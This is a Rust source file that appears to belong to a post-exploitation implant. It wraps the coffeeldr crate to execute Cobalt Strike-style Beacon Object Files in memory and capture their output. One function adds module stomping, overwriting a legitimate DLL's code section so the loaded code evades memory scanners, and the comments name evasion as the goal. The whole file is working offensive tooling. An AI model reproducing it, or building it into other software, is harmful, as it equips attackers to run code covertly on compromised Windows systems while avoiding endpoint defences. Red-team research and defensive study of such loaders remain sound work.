//! COFF loader wrapper using coffeeldr
//!
//! Provides a clean interface for loading and executing BOF files in memory.

use coffeeldr::CoffeeLdr;
use std::error::Error;

/// Execute a COFF file from an in-memory buffer
///
/// This function loads the COFF into memory and executes the specified entry point.
/// Output from BeaconPrintf/BeaconOutput is captured and returned.
///
/// # Arguments
/// * `coff_data` - Raw COFF file bytes (.o file)
/// * `entry_point` - Function name to call (usually "go")
/// * `args` - Packed CS-compatible arguments (can be empty)
///
/// # Returns
/// * `Ok(String)` - Output captured from the BOF execution
/// * `Err` - If loading or execution fails
///
/// # Example
/// ```ignore
/// let bof_bytes = include_bytes!("whoami.x64.o");
/// let output = execute_coff(bof_bytes, "go", &[])?;
/// println!("BOF output: {}", output);
/// ```
pub fn execute_coff(
    coff_data: &[u8],
    entry_point: &str,
    args: &[u8],
) -> Result<String, Box<dyn Error>> {
    // Load COFF from memory buffer
    let mut loader = CoffeeLdr::new(coff_data)
        .map_err(|e| format!("Failed to load COFF: {:?}", e))?;

    // Execute the BOF at the specified entry point
    // coffeeldr expects raw pointer for args and usize for length
    let (args_ptr, args_len) = if args.is_empty() {
        (None, None)
    } else {
        // SAFETY: We're passing a valid pointer to our args buffer
        // The buffer remains valid for the duration of the run() call
        (
            Some(args.as_ptr() as *mut u8),
            Some(args.len()),
        )
    };

    let output = loader
        .run(entry_point, args_ptr, args_len)
        .map_err(|e| format!("BOF execution failed: {:?}", e))?;

    Ok(output)
}

/// Execute COFF with module stomping for enhanced evasion
///
/// This variant overwrites the .text section of a legitimate loaded DLL
/// with the COFF code, making it appear as if the code originates from
/// a trusted module. The original content is restored after execution.
///
/// # Arguments
/// * `coff_data` - Raw COFF file bytes
/// * `entry_point` - Function name to call
/// * `args` - Packed CS-compatible arguments
/// * `stomp_module` - Name of the DLL to stomp (e.g., "xpsservices.dll")
///
/// # Security Note
/// Module stomping helps evade memory scanners that look for unbacked
/// executable memory regions.
#[allow(dead_code)]
pub fn execute_coff_stomped(
    coff_data: &[u8],
    entry_point: &str,
    args: &[u8],
    stomp_module: &str,
) -> Result<String, Box<dyn Error>> {
    // Load COFF from memory buffer with module stomping configured
    // with_module_stomping() uses builder pattern and consumes self
    let mut loader = CoffeeLdr::new(coff_data)
        .map_err(|e| format!("Failed to load COFF: {:?}", e))?
        .with_module_stomping(stomp_module);

    // Execute the BOF
    let (args_ptr, args_len) = if args.is_empty() {
        (None, None)
    } else {
        (
            Some(args.as_ptr() as *mut u8),
            Some(args.len()),
        )
    };

    let output = loader
        .run(entry_point, args_ptr, args_len)
        .map_err(|e| format!("BOF execution failed: {:?}", e))?;

    Ok(output)
}
